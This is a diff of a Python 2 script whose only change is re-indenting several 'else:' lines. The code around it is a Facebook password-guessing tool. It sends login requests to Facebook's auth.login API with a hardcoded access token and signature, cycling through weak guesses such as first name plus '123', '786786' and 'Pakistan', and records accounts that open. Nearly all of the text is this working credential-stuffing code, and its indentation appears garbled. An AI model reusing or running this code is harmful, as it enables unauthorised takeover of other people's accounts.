@@ -316,7 +316,7 @@ def pilih_super():
 				print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass1 + ' Jam '											
 				oks.append(user+pass1)
                         
-                                else:
+                                 else:
 				    pass2 = b['first_name'] + '123'										
                                     data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			            q = json.load(data)												
@@ -326,7 +326,7 @@ def pilih_super():
 				            print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass2 + ' Jam '											
 				            oks.append(user+pass2)
                                     								
-				           else:											
+				            else:											
 					       pass3 = '786000'									
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					       q = json.load(data)										
@@ -336,7 +336,7 @@ def pilih_super():
 						       print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass3 + ' Jam '									
 						       oks.append(user+pass3)
                                                								
-					               else:										
+					                else:										
 						           pass4 = '000786'										
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
@@ -346,7 +346,7 @@ def pilih_super():
 				                                   print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass4 + ' Jam '											
 				                                   oks.append(user+pass4)
                                                            					
-					                           else:									
+					                            else:									
 						                       pass5 = '786786'							
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
@@ -356,7 +356,7 @@ def pilih_super():
 						                               print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' Jam '							
 						                               oks.append(user+pass5)	
                                                                        			                                                       					
-						                               else:								
+						                                else:								
 							                           pass6 = 'Pakistan'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
@@ -366,7 +366,7 @@ def pilih_super():
 				                                                           print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' Jam '											
 				                                                           oks.append(user+pass6)
                                                                                    	
-						                                           else:							
+						                                            else:							
 								                               pass7 = b['last_name'] + '123'						
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
 								                               q = json.load(data)						
